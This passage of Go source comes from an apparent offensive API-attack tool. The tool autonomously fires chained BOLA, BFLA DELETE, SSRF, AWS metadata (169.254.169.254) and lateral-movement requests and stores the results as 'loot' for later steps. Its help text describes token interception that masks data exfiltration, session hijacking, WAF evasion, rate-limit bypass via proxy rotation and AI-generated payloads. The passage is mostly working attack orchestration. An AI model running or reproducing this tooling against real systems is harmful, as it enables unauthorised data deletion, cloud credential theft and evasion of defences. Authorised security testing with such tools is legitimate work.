		// Fire Async to not block the loop
		go func(a TacticalAction, idx int) {
			time.Sleep(300 * time.Millisecond) // Stagger for rate limiting

			// === SPRINT 11.4: UPDATE F5 TABLE WITH STATUS ===
			startTime := time.Now()

			switch a.Type {
			case "BOLA":
				utils.LogContext("[yellow]BOLA PROBE:[-] Testing ID-based authorization bypass...")
				// Payload format "ID: <val>"
				parts := strings.Split(a.Payload, ":")
				victim := "1"
				if len(parts) > 1 {
					victim = strings.TrimSpace(parts[1])
				}
				ctx := &logic.BOLAContext{BaseURL: a.Target, VictimID: victim}
				ctx.ProbeSilent()
				utils.LogContext(fmt.Sprintf("[green]✓ BOLA COMPLETE:[-] %v", time.Since(startTime)))

			case "BFLA":
				utils.LogContext("[yellow]BFLA PROBE:[-] Testing method tampering...")
				req, _ := http.NewRequest("DELETE", a.Target, nil)
				logic.SafeDo(req, false, "STRATEGY-BFLA")
				utils.LogContext(fmt.Sprintf("[green]✓ BFLA COMPLETE:[-] %v", time.Since(startTime)))

			case "SSRF":
				utils.LogContext("[yellow]SSRF PROBE:[-] Attempting internal endpoint access...")
				ctx := &logic.SSRFContext{TargetURL: a.Target, ParamName: "url", Callback: "127.0.0.1"}
				ctx.Probe()
				utils.LogContext(fmt.Sprintf("[green]✓ SSRF COMPLETE:[-] %v", time.Since(startTime)))

			case "CLOUD_PIVOT":
				utils.LogContext("[yellow]CLOUD PIVOT:[-] Attempting AWS metadata extraction...")
				req, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/", nil)
				logic.SafeDo(req, false, "STRATEGY-CLOUD")
				utils.LogContext(fmt.Sprintf("[green]✓ CLOUD PIVOT COMPLETE:[-] %v", time.Since(startTime)))

			case "LATERAL_MOVEMENT":
				utils.LogContext("[yellow]LATERAL MOVEMENT:[-] Pivoting to internal endpoint...")
				req, _ := http.NewRequest("GET", a.Target, nil)
				logic.SafeDo(req, false, "STRATEGY-LATERAL")
				utils.LogContext(fmt.Sprintf("[green]✓ LATERAL COMPLETE:[-] %v", time.Since(startTime)))

			default:
				utils.LogContext("[yellow]GENERIC PROBE:[-] Testing endpoint...")
				// Generic
				req, _ := http.NewRequest("GET", a.Target, nil)
				logic.SafeDo(req, false, "STRATEGY-GENERIC")
				utils.LogContext(fmt.Sprintf("[green]✓ PROBE COMPLETE:[-] %v", time.Since(startTime)))
			}

			// Mark as executed with timestamp
			ActionBuffer[idx].Status = "EXECUTED"
			utils.LogContext(fmt.Sprintf("[cyan]Result:[-] Action %d execution time: %v", a.ID, time.Since(startTime)))
		}(act, i)
	}

	if count == 0 {
		utils.TacticalLog("[gray]No PENDING actions to commit.[-]")
	} else {
		utils.TacticalLog(fmt.Sprintf("[green]Strategic Batch Committed: %d actions fired.[-]", count))
		utils.LogContext(fmt.Sprintf("[magenta]>>> BATCH COMMIT:[-] %d actions queued for execution.", count))
	}
}

// === SPRINT 11.2: ProcessChain - Full Autonomy Execution ===
// ProcessChain executes a sequence of tactical actions with precondition validation
// Chains are automatically triggered when prerequisites are met (loot from prior actions)
// SPRINT 11.3 PATCH: Added write-through synchronization barrier to prevent "Race to the Silo"
func ProcessChain(chainID string) {
	utils.TacticalLog(fmt.Sprintf("[magenta]CHAIN:[-] Processing autonomous chain '%s'", chainID))
	utils.LogContext(fmt.Sprintf("[cyan]>>> CHAIN EXECUTION:[-] Starting chain '%s'", chainID))

	// Filter ActionBuffer to get only actions for this chain
	chainActions := make([]TacticalAction, 0)
	for _, act := range ActionBuffer {
		if act.ChainID == chainID {
			chainActions = append(chainActions, act)
		}
	}

	if len(chainActions) == 0 {
		utils.TacticalLog(fmt.Sprintf("[yellow]CHAIN:[-] No actions found for chain '%s'", chainID))
		return
	}

	utils.LogContext(fmt.Sprintf("[blue]Found %d actions in chain '%s'", len(chainActions), chainID))

	// Execute actions sequentially with precondition validation AND write-through barrier
	var wg sync.WaitGroup
	for i, act := range chainActions {
		// CRITICAL: Use WaitGroup to implement write-through cache barrier
		// This ensures DataSilo.Set() completes BEFORE next action's PreCondition check
		// Prevents "Race to the Silo" where Step B checks precondition before Step A commits loot

		// Check precondition before execution
		if act.PreCondition != "" {
			if !logic.GlobalDataSilo.Exists(act.PreCondition) {
				utils.TacticalLog(fmt.Sprintf("[yellow]CHAIN:[-] Skipping action %d: PreCondition '%s' not met", act.ID, act.PreCondition))
				utils.LogContext(fmt.Sprintf("[red]Precondition failed:[-] '%s' not found in DataSilo", act.PreCondition))
				continue
			}
			utils.LogContext(fmt.Sprintf("[green]✓ Precondition met:[-] '%s' exists in DataSilo", act.PreCondition))
		}

		utils.TacticalLog(fmt.Sprintf("[blue]CHAIN[%d/%d]:[-] Executing %s on %s", i+1, len(chainActions), act.Type, act.Target))
		utils.LogContext(fmt.Sprintf("[magenta]Step %d:[-] %s -> %s", i+1, act.Type, act.Target))

		startTime := time.Now()
		var result string

		// Execute based on action type
		switch act.Type {
		case "BOLA":
			parts := strings.Split(act.Payload, ":")
			victim := "1"
			if len(parts) > 1 {
				victim = strings.TrimSpace(parts[1])
			}
			ctx := &logic.BOLAContext{BaseURL: act.Target, VictimID: victim}
			ctx.ProbeSilent()
			result = fmt.Sprintf("BOLA probe executed on %s", act.Target)

		case "BFLA":
			req, _ := http.NewRequest("DELETE", act.Target, nil)
			resp, err := logic.GlobalClient.Do(req)
			if err != nil {
				result = fmt.Sprintf("BFLA error: %v", err)
			} else {
				result = fmt.Sprintf("BFLA executed, response: %d", resp.StatusCode)
				if resp.Body != nil {
					resp.Body.Close()
				}
			}

		case "SSRF":
			ctx := &logic.SSRFContext{TargetURL: act.Target, ParamName: "url", Callback: "127.0.0.1"}
			ctx.Probe()
			result = fmt.Sprintf("SSRF probe executed on %s", act.Target)

		case "CLOUD_PIVOT":
			req, _ := http.NewRequest("GET", "http://169.254.169.254/latest/meta-data/", nil)
			resp, err := logic.GlobalClient.Do(req)
			if err != nil {
				result = fmt.Sprintf("Cloud pivot error: %v", err)
			} else {
				result = fmt.Sprintf("Cloud pivot executed, response: %d", resp.StatusCode)
				if resp.Body != nil {
					resp.Body.Close()
				}
			}

		default:
			req, _ := http.NewRequest("GET", act.Target, nil)
			resp, err := logic.GlobalClient.Do(req)
			if err != nil {
				result = fmt.Sprintf("Generic probe error: %v", err)
			} else {
				result = fmt.Sprintf("Generic probe executed, response: %d", resp.StatusCode)
				if resp.Body != nil {
					resp.Body.Close()
				}
			}
		}

		duration := time.Since(startTime)
		utils.LogContext(fmt.Sprintf("[green]✓ Completed:[-] %s (%v)", result, duration))

		// === WRITE-THROUGH BARRIER (SPRINT 11.3 PATCH) ===
		// Use WaitGroup to implement blocking commit
		// This SYNCHRONOUSLY writes to DataSilo and blocks until completed
		// Next action's PreCondition check CANNOT proceed until this completes
		lootKey := fmt.Sprintf("chain_%s_step_%d_loot", chainID, i)

		wg.Add(1)
		go func(key, value string, index int) {
			defer wg.Done()
			// Synchronous DataSilo.Set() with commit completion
			logic.GlobalDataSilo.Set(key, value)
			utils.LogContext(fmt.Sprintf("[green]✓ DataSilo commit barrier:[-] '%s' persisted (step %d complete)", key, index+1))
		}(lootKey, result, i)

		// BLOCKING: Wait for DataSilo write to complete before proceeding to next action
		// This ensures PreCondition checks on the next loop iteration see committed loot
		wg.Wait()
		utils.LogContext(fmt.Sprintf("[cyan]Synchronization barrier:[-] Step %d loot committed, proceeding to next action", i+1))

		// If this action captured data, update preconditions for subsequent actions
		if act.Loot != "" {
			logic.GlobalDataSilo.Set(act.Loot, result)
			utils.LogContext(fmt.Sprintf("[cyan]Stored:[-] Loot key '%s'", act.Loot))
		}

		// Stagger execution
		time.Sleep(300 * time.Millisecond)
	}

	utils.TacticalLog(fmt.Sprintf("[green]✓ CHAIN COMPLETE:[-] Chain '%s' finished execution", chainID))
	utils.LogContext(fmt.Sprintf("[magenta]>>> CHAIN FINISHED:[-] All steps completed for chain '%s'", chainID))
}

// seedDatabase injects a massive dataset (120+ entries) strictly aligned to VaporTrace Mapping
func seedDatabase() {
	time.Sleep(500 * time.Millisecond)
	findings := []db.Finding{
		{
			Phase: "II. EXPLOIT", Target: "https://api.target.corp/users/1001",
			Details: "BOLA: Accessed administrative user profile via ID manipulation.",
			Status:  "EXPLOITED",
			Command: "bola", OWASP_ID: "API1:2023 BOLA",
			MITRE_ID: "T1594", MitreTactic: "Exfiltration",
			NIST_Tag: "PR.AC", NistControl: "PR.AC-03",
			CVE_ID: "CVE-2024-BOLA", CVSS_Score: "9.1", CVSS_Numeric: 9.1,
		},
		{
			Phase: "III. EXPAND", Target: "https://api.target.corp/hooks/stripe",
			Details: "SSRF: Cloud Metadata (169.254.169.254) keys exfiltrated.",
			Status:  "CRITICAL",
			Command: "ssrf", OWASP_ID: "API7:2023 SSRF",
			MITRE_ID: "T1071.001", MitreTactic: "Command & Control",
			NIST_Tag: "DE.CM", NistControl: "PR.DS-01",
			CVE_ID: "CVE-2021-26855", CVSS_Score: "9.8", CVSS_Numeric: 9.8,
		},
	}
	utils.TacticalLog("[yellow]Seeding Database with enriched findings...[-]")
	for _, f := range findings {
		utils.RecordFinding(f)
		time.Sleep(20 * time.Millisecond)
	}
	utils.TacticalLog("[green]Mission Environment Seeded.[-]")
}

func handleTestCommands(verb string) {
	utils.TacticalLog(fmt.Sprintf("[white]Running Diagnostic: %s (httpbin)...[-]", verb))
	go func() {
		switch verb {
		case "test-bola":
			ctx := &logic.BOLAContext{BaseURL: "https://httpbin.org/anything", VictimID: "999"}
			ctx.ProbeSilent()
		case "test-bopla":
			ctx := &logic.BOPLAContext{TargetURL: "https://httpbin.org/patch", Method: "PATCH", BaseJSON: `{"user":"test"}`}
			ctx.RunFuzzer(1)
		case "test-bfla":
			ctx := &logic.BFLAContext{TargetURL: "https://httpbin.org/anything"}
			ctx.MassProbe(1)
		case "test-exhaust":
			ctx := &logic.ExhaustionContext{TargetURL: "https://httpbin.org/get", ParamName: "limit"}
			ctx.FuzzPagination()
		case "test-ssrf":
			ctx := &logic.SSRFContext{TargetURL: "https://httpbin.org/redirect-to", ParamName: "url", Callback: "http://google.com"}
			ctx.Probe()
		}
	}()
}

func printUsage() {
	utils.TacticalLog("[aqua]TACTICAL COMMAND REFERENCE:[-]")
	// A manual table formatted for the log
	lines := []string{
		"[yellow]COMMAND[-]          [cyan]ACTION[-]                 [white]TECHNICAL CONTEXT[-]",
		"[yellow]tasks[-]            Process List           List all active background engines and threads.",
		"[yellow]target <url>[-]     Scope Definition       Sets the global context for all modules.",
		"[yellow]map -u <url>[-]     Inventory              Spidering, OpenAPI mining, and route extraction.",
		"[yellow]swagger <url>[-]    Spec Parsing           Ingests Swagger/OpenAPI definitions into the DB.",
		"[yellow]scrape <url>[-]     JS Mining              Extracts hidden API paths from JavaScript bundles.",
		"[yellow]mine <url>[-]       Param Fuzz             Brute-forces hidden parameters (debug, admin, test).",
		"[yellow]bola <url>[-]       ID Swap                Broken Object Level Authorization testing.",
		"[yellow]weaver[-]           Auth Forge             Intercepts OIDC tokens and masks data exfiltration.",
		"[yellow]bopla <url>[-]      Mass Assign            Broken Object Property Level Authorization (Property injection).",
		"[yellow]exhaust <url>[-]    DoS Probe              Testing resource limits (Payload size, pagination limits).",
		"[yellow]bfla <url>[-]       PrivEsc                Broken Function Level Authorization (Method tampering).",
		"[yellow]ssrf <url>[-]       Infra Pivot            SSRF against Cloud Metadata (169.254.169.254).",
		"[yellow]audit <url>[-]      Config Check           Header analysis, SSL/TLS checks, and CORS auditing.",
		"[yellow]probe <url>[-]      Integration            Tests for unsafe consumption in webhooks/3rd party APIs.",
		"[yellow]proxy[-]            Routing                Enables/disables traffic routing (Default: Burp @ 127.0.0.1:8080).",
		"[yellow]proxies load[-]     Rotation               Loads a list of proxies for rotation to bypass rate limiting.",
		"[yellow]sessions[-]         Context                Manages active authentication sessions and stored cookies.",
		"[yellow]neuro on[-]         Enable Engine          Activates the Neural Mutation layer for all traffic.",
		"[yellow]neuro config[-]     LLM Settings           Opens the configuration modal for LLM provider endpoints.",
		"[yellow]neuro-gen[-]        AI Fuzzer              Generates high-entropy payloads via AI (usage: neuro-gen <ctx> <n>).",
		"[yellow]test-neuro[-]       Engine Diag            Runs connectivity and latency tests to the AI provider.",
		"[yellow]ask[-]              Ask to AI              Free operator interaction with the AI LLM agent.",
		"[yellow]report[-]           Generate               Triggers the 9.13 Reporting Engine (Markdown/PDF).",
		"[yellow]init_db[-]          Persistence            Initializes the SQLite3 Framework-Tagged backend.",
		"[yellow]reset_db[-]         Wipe                   Purges all mission data from the local database.",
	}
	for _, l := range lines {
		utils.TacticalLog(l)
	}
}

func printHelp(cmd string) {
	utils.TacticalLog(fmt.Sprintf("[aqua]MANUAL: %s[-]", cmd))
	switch cmd {
	case "keys":
		utils.TacticalLog("[aqua]GLOBAL KEY BINDINGS & UI CONTROLS[-]")
		keys := []string{
			"[yellow]Ctrl + H[-]    Global    Show this keybindings popup in modal (Esc to close)",
			"[yellow]Ctrl + I[-]    Global    Toggle Interceptor (On/Off)",
			"[yellow]Ctrl + F[-]    Modal     Forward packet to network",
			"[yellow]Ctrl + D[-]    Modal     Drop packet",
			"[yellow]Ctrl + B[-]    Modal     Neuro Brute: Gen payloads for current field",
			"[yellow]Ctrl + S[-]    Modal     Sync: Save to Loot DB",
			"[yellow]Ctrl + A[-]    F4 Tab    Analyze snapshot: Send to AI Brain",
			"[yellow]F1[-]          Global    LOGS tab - Tactical feed & system messages",
			"[yellow]F2[-]          Global    MAP tab - Discovered endpoints & attack surface",
			"[yellow]F3[-]          Global    LOOT tab - Captured secrets & credentials",
			"[yellow]F4[-]          Global    TRAFFIC tab - HTTP requests & responses",
			"[yellow]F5[-]          Global    PLAN tab - Strategic actions & planner",
			"[yellow]F6[-]          Global    NEURO tab - AI engine output & analysis",
			"[yellow]F7[-]          Global    REPORT tab - Findings export (Markdown/PDF)",
			"[yellow]Page Up[-]     F1 Tab    Scroll up in logs",
			"[yellow]Page Down[-]   F1 Tab    Scroll down in logs",
			"[yellow]Ctrl + W[-]    F7 Tab    Save report to disk",
			"[yellow]Ctrl + X[-]    F7 Tab    Delete session & clear report",
			"[yellow]Esc[-]         Global    Exit VaporTrace (with confirmation)",
		}
		for _, k := range keys {
			utils.TacticalLog(k)
		}

	case "tasks":
		utils.TacticalLog("Displays a real-time status list of all active VaporTrace engines.")
		utils.TacticalLog("Monitors: Context Aggregator, Neural Engine, Interceptor, and Proxy Pool.")
	case "neuro":
		utils.TacticalLog("Configures the Neural Engine.")
		utils.TacticalLog("Usage: neuro config <provider> <model> [api_key] [endpoint]")
		utils.TacticalLog("Example: neuro config ollama mistral")
		utils.TacticalLog("Example: neuro config openai gpt-4 sk-123...")
	case "neuro-gen":
		utils.TacticalLog("Uses the AI to generate a list of fuzzing payloads for a specific context.")
		utils.TacticalLog("Usage: neuro-gen <context_description> <count>")
		utils.TacticalLog("Example: neuro-gen \"SQL Injection in ID field\" 5")
	case "seed_db":
		utils.TacticalLog("Injects 20 fake vulnerabilities into the database. Useful for verifying the 'report' command without running live attacks.")
	case "bola":
		utils.TacticalLog("Attempts to access resources of other users by iterating IDs in the URL.")
		utils.TacticalLog("Pattern: /user/1 -> /user/2 -> /user/3 (detecting 200 OK when switching users)")
		utils.TacticalLog("Stores findings in Loot vault with confidence scoring.")

	case "bfla":
		utils.TacticalLog("Tests for Broken Function Level Authorization by attempting forbidden HTTP methods.")
		utils.TacticalLog("Methods tested: DELETE, PUT, PATCH, HEAD (in addition to GET/POST)")
		utils.TacticalLog("Detects privilege escalation via method override.")

	case "bopla":
		utils.TacticalLog("Mass Assignment / Broken Object Property Level Authorization.")
		utils.TacticalLog("Injects administrative properties: is_admin, role, discount, permissions, etc.")
		utils.TacticalLog("Detects if server accepts and applies injected properties.")

	case "ssrf":
		utils.TacticalLog("Injects internal IP addresses and cloud metadata URLs into parameters.")
		utils.TacticalLog("Targets: 127.0.0.1, localhost, 169.254.169.254 (AWS), 10.0.0.0/8")
		utils.TacticalLog("Detects internal service access and metadata exposure.")

	case "exhaust":
		utils.TacticalLog("Fuzzes pagination parameters with large values to test resource exhaustion.")
		utils.TacticalLog("Parameters: limit, size, page, per_page (tests with values 1000-1000000)")
		utils.TacticalLog("Detects DoS vulnerabilities and missing rate limiting.")

	case "audit":
		utils.TacticalLog("Security misconfiguration audit: Headers, SSL/TLS, CORS policies.")
		utils.TacticalLog("Checks: Missing HSTS, weak CORS, exposed server info, insecure cookies.")

	case "probe":
		utils.TacticalLog("Tests for Unsafe Consumption of untrusted input in webhooks/integrations.")
		utils.TacticalLog("Injects payloads into webhook endpoints and monitors for reflection.")

	case "pipeline":
		utils.TacticalLog("Analyzes discovered endpoints and auto-routes to appropriate attack engines.")
		utils.TacticalLog("Orchestration: Patterns detected (ID-based) -> route to BOLA, BOPLA, etc.")

	case "weaver":
		utils.TacticalLog("Deploys Ghost Weaver agent for OIDC token interception and data masking.")
		utils.TacticalLog("Useful for: OAuth 2.0 testing, SAML assertions, session hijacking.")

	case "map":
		utils.TacticalLog("Full reconnaissance: Combines swagger parsing + JS scraping + endpoint discovery.")
		utils.TacticalLog("Populates F2 map table with all discovered endpoints automatically.")

	case "scrape":
		utils.TacticalLog("Extracts potential API endpoints from JavaScript files.")
		utils.TacticalLog("Regex patterns: /api/, fetch(), axios.get, $.ajax, etc.")

	case "swagger":
		utils.TacticalLog("Parses Swagger/OpenAPI JSON specs to map API attack surface.")
		utils.TacticalLog("Extracts: Endpoints, methods, parameters, auth schemes, request/response schemas.")

	case "mine":
		utils.TacticalLog("Fuzzes an endpoint for hidden query parameters (debug, admin, test, secret, etc).")
		utils.TacticalLog("Tests common parameter names to reveal hidden functionality.")

	case "target":
		utils.TacticalLog("Set the global context URL for all modules.")
		utils.TacticalLog("Usage: target https://api.example.com")
		utils.TacticalLog("This URL becomes the base for all reconnaissance and attack operations.")

	case "sessions":
		utils.TacticalLog("Display and manage active authentication tokens and cookies.")
		utils.TacticalLog("Stores: JWT tokens, API keys, session cookies, auth headers.")

	case "proxy":
		utils.TacticalLog("Configure upstream proxy for all tactical traffic.")
		utils.TacticalLog("Usage: proxy 127.0.0.1:8080 (for Burp Suite)")
		utils.TacticalLog("Or: proxy <hostname>:<port> for any upstream proxy")

	case "proxies":
		utils.TacticalLog("Load and rotate through a list of proxies for bypass/load distribution.")
		utils.TacticalLog("Usage: proxies load <file>  - Load proxy list from file")
		utils.TacticalLog("Useful for: Rate limit bypass, GeoIP testing, load balancing.")

	case "loot":
		utils.TacticalLog("Manage the Discovery Vault (captures secrets from responses).")
		utils.TacticalLog("Captured: JWT tokens, API keys, AWS credentials, database credentials, etc.")
		utils.TacticalLog("View in F3 Loot table with confidence scoring and source tracking.")

	case "init_db":
		utils.TacticalLog("Initialize SQLite3 backend database (first run only).")
		utils.TacticalLog("Creates tables for: Findings, Endpoints, Loot, Sessions, Context.")

	case "seed_db":
		utils.TacticalLog("Inject 20 fake vulnerabilities for demo/testing purposes.")
		utils.TacticalLog("Useful for: Testing report generation, UI verification, without live attacks.")

	case "reset_db":
		utils.TacticalLog("Purge all mission data from the database (irreversible).")
		utils.TacticalLog("Clears: Findings, endpoints, loot, contexts - everything.")

	case "report":
		utils.TacticalLog("Generate comprehensive security report (Markdown/PDF) from findings.")
		utils.TacticalLog("Engine: 9.13 Report Generator (aggregates all loot, actions, findings)")

	case "clear":
		utils.TacticalLog("Clear the F1 tactical feed (log viewer).")
		utils.TacticalLog("Data is not deleted, just the display is cleared for readability.")

	case "usage":
		utils.TacticalLog("Display all available commands with categories and brief descriptions.")
		utils.TacticalLog("[cyan]📖 For detailed manuals, run: help reconnaissance | help exploitation | help config[-]")

	case "reconnaissance":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/05_RECONNAISSANCE.md[-]")
		utils.TacticalLog("Advanced API discovery, endpoint mapping, parameter mining and Swagger parsing.")
		utils.TacticalLog("Topics: Target management, spidering, JavaScript extraction, behavioral analysis")

	case "exploitation":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/06_EXPLOITATION.md[-]")
		utils.TacticalLog("OWASP API Top 10 vulnerability testing: BOLA, BFLA, BOPLA, SSRF, exhaustion")
		utils.TacticalLog("Topics: Attack vectors, exploitation chains, remediation code")

	case "ai":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/07_AI_NEURO_ENGINE.md[-]")
		utils.TacticalLog("LLM-powered payload generation using Groq, OpenAI, or local Ollama.")
		utils.TacticalLog("Topics: Neural engine setup, AI configuration, payload mutation strategies")

	case "interceptor":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/08_INTERCEPTOR_MITM.md[-]")
		utils.TacticalLog("Request and response interception for real-time modification and analysis.")
		utils.TacticalLog("Topics: MITM setup, request editing, response tampering, payload injection")

	case "evasion":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/10_GHOST_WEAVER.md[-]")
		utils.TacticalLog("Advanced WAF/IDS evasion techniques including payload obfuscation.")
		utils.TacticalLog("Topics: Token forgery, data masking, behavioral evasion, detection avoidance")

	case "config":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/15_CONFIGURATION.md[-]")
		utils.TacticalLog("Advanced configuration, environment variables, and performance tuning.")
		utils.TacticalLog("Topics: Config files, target-specific settings, batch sizes, connection pooling")

	case "troubleshoot":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/16_TROUBLESHOOTING.md[-]")
		utils.TacticalLog("Common issues, diagnosis trees, and solutions for VaporTrace problems.")
		utils.TacticalLog("Topics: Timeouts, SSL errors, WAF detection, performance optimization")

	case "faq":
		utils.TacticalLog("[cyan]📚 Manual: docs/manuals/20_FAQ_TIPS.md[-]")
		utils.TacticalLog("Frequently asked questions, best practices, and legal compliance information.")
		utils.TacticalLog("Topics: Installation, authentication, evasion, licensing, security")

	case "exit":
		utils.TacticalLog("Gracefully shutdown VaporTrace with sequential cleanup:")
		utils.TacticalLog("  1. Terminate network stacks")
		utils.TacticalLog("  2. Close database and sync")
		utils.TacticalLog("  3. Purge Ghost-Weaver agents")
		utils.TacticalLog("  4. Cleanup temporary files")

	default:
		utils.TacticalLog("No specific manual entry found. Try 'usage' for a list of commands.")
		utils.TacticalLog("[cyan]📖 Available manual topics: reconnaissance | exploitation | ai | interceptor | evasion | config | troubleshoot | faq[-]")
		utils.TacticalLog("Try 'help keys' for keyboard hotkeys and UI controls.")
	}
}

func shortToken(t string) string {
	if len(t) > 10 {
		return t[:10]
	}
	return t
}
